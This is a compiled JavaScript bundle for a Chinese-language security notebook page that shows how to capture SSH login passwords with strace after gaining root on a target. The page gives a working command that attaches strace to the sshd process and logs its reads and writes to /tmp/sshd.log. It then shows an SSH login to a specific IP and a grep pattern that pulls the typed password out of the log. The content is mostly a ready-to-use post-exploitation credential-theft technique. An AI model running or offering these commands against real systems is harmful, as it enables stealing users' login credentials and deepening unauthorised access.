import{ah as i,ai as a,an as e,am as h}from"./app-8q9JYMeB.js";const t="/assets/image-20240717135239224-C1H30aJM.png",n={};function r(l,s){return h(),a("div",null,s[0]||(s[0]=[e('<h1 id="strace抓取ssh密码" tabindex="-1"><a class="header-anchor" href="#strace抓取ssh密码"><span>Strace抓取ssh密码</span></a></h1><blockquote><p>strace是一个可用于诊断、调试和教学的Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</p><p>在后面抓取用户密码的时候，我们会使用这个软件来监控用户的ssh登录操作。</p></blockquote><h2 id="跟踪监听程序" tabindex="-1"><a class="header-anchor" href="#跟踪监听程序"><span>跟踪监听程序</span></a></h2><p>获取到目标root权限后，直接在终端执行如下命令，该命令会监听sshd进程，并将登录过程及信息记录到/tmp/sshd.log文件中</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">strace</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -f</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -F</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> `</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ps</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> aux</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;sshd -D&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">grep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> grep</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> {&#39;print $2&#39;}`</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> trace=read,write</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -s</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 32</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> 2&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/tmp/sshd.log</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &amp;)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>接着模拟管理员ssh登录。输入正确的密码</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ssh</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> root@120.46.62.62</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="筛选登录密码" tabindex="-1"><a class="header-anchor" href="#筛选登录密码"><span>筛选登录密码</span></a></h2><p>如图所示。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>grep -E &#39;read\\(6, &quot;.+\\\\0\\\\0\\\\0\\\\.+&quot;&#39; /tmp/sshd.log</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="'+t+'" alt="image-20240717135239224"></p>',11)]))}const p=i(n,[["render",r]]),d=JSON.parse('{"path":"/note-book/Security/Strace%E6%8A%93%E5%8F%96ssh%E5%AF%86%E7%A0%81.html","title":"Strace抓取ssh密码","lang":"zh-CN","frontmatter":{"feed":false,"seo":false,"head":[]},"git":{"createdTime":1721196187000,"updatedTime":1721196187000,"contributors":[{"name":"PaperDragon-SH","username":"PaperDragon-SH","email":"2678885646@qq.com","commits":1,"url":"https://github.com/PaperDragon-SH"}]},"readingTime":{"minutes":0.74,"words":223},"filePathRelative":"note-book/Security/Strace抓取ssh密码.md","localizedDate":"2024年7月17日"}');export{p as comp,d as data};
